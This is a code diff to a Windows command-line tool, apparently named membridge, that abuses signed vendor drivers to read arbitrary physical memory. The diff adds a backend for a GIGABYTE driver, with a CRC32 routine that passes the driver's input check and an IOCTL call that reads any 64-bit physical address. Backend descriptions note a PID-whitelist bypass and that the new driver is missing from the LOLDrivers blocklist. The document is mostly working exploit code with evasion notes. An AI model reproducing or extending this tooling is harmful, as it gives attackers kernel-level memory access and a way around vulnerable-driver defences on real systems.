@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -81,6 +81,9 @@ static const backend_t g_backends[] = {
     { L"glckio2", L"drivers\\glckio2\\glckio2.sys",
       BK_CONTROL, L"MembridgeGlckio2", L"\\\\.\\GLCKIo2", LY_GLCKIO2_MAP, 1,
       L"glckio2.sys (ASUS GLCKIO2; PID whitelist bypass via AES registration + IOCTL_WINIO_MAPPHYSTOLIN 0x80102040, arbitrary 64-bit PA)" },
+    { L"gibepext", L"drivers\\gibepext\\gibepext.sys",
+      BK_CONTROL, L"MembridgeGibepExt", L"\\\\.\\GibEpExt", LY_GIBEPEXT, 1,
+      L"gibepext.sys (GIGABYTE EP firmware/forensic; CRC32-gated IOCTL_READ_PHYSMEM 0x22E00C, arbitrary 64-bit PA; LOLDrivers unlisted)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -113,6 +116,7 @@ static const char *layout_name(layout_t l) {
     case LY_RTKIO_MAP: return "rtkio";
     case LY_ENEIO_MAP: return "eneio64";
     case LY_GLCKIO2_MAP: return "glckio2";
+    case LY_GIBEPEXT: return "gibepext";
     }
     return "?";
 }
@@ -597,6 +601,47 @@ static int read_glckio2_map(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out
     return 0;
 }
 
+// gibepext (GIGABYTE EP firmware/forensic): IOCTL_READ_PHYSMEM 0x22E00C.
+// Input 16B: {u32 PA_high; u32 PA_low; u32 size; u32 crc32(first 12 bytes)}; output = physical bytes.
+// The driver validates a standard CRC-32 (poly 0xEDB88320, init 0xFFFFFFFF, final xor) of the header.
+static uint32_t g_gib_crc_tab[256];
+static int g_gib_crc_ready = 0;
+
+static void gib_crc32_init(void) {
+    if (g_gib_crc_ready) return;
+    for (uint32_t i = 0; i < 256; i++) {
+        uint32_t c = i;
+        for (int k = 0; k < 8; k++)
+            c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
+        g_gib_crc_tab[i] = c;
+    }
+    g_gib_crc_ready = 1;
+}
+
+static uint32_t gib_crc32(const uint8_t *p, uint32_t n) {
+    uint32_t c = 0xFFFFFFFFu;
+    for (uint32_t i = 0; i < n; i++)
+        c = (c >> 8) ^ g_gib_crc_tab[(c ^ p[i]) & 0xFF];
+    return ~c;
+}
+
+static int read_gibepext(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[16];
+    DWORD ret = 0;
+    gib_crc32_init();
+    memset(in, 0, sizeof(in));
+    *(uint32_t *)(in + 0) = (uint32_t)(pa >> 32);
+    *(uint32_t *)(in + 4) = (uint32_t)(pa & 0xFFFFFFFFu);
+    *(uint32_t *)(in + 8) = size;
+    *(uint32_t *)(in + 12) = gib_crc32(in, 12);
+    if (!DeviceIoControl(dev, 0x22E00Cu, in, sizeof(in), out, size, &ret, NULL)) {
+        wprintf(L"[ERR] gibepext IOCTL_READ_PHYSMEM err=%lu\n", GetLastError());
+        return 0;
+    }
+    if (ret != size) { wprintf(L"[WARN] gibepext returned %lu bytes (want %u)\n", (unsigned long)ret, size); }
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -608,6 +653,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_RTKIO_MAP: return read_rtkio_map(dev, pa, size, out);
     case LY_ENEIO_MAP: return read_eneio_map(dev, pa, size, out);
     case LY_GLCKIO2_MAP: return read_glckio2_map(dev, pa, size, out);
+    case LY_GIBEPEXT: return read_gibepext(dev, pa, size, out);
     }
     return 0;
 }
@@ -649,7 +695,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -700,6 +746,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"rtkio") == 0 || _wcsicmp(layout, L"rtkio_map") == 0) g_manual_layout = LY_RTKIO_MAP;
         else if (_wcsicmp(layout, L"eneio64") == 0 || _wcsicmp(layout, L"eneio") == 0) g_manual_layout = LY_ENEIO_MAP;
         else if (_wcsicmp(layout, L"glckio2") == 0 || _wcsicmp(layout, L"glckio") == 0) g_manual_layout = LY_GLCKIO2_MAP;
+        else if (_wcsicmp(layout, L"gibepext") == 0) g_manual_layout = LY_GIBEPEXT;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
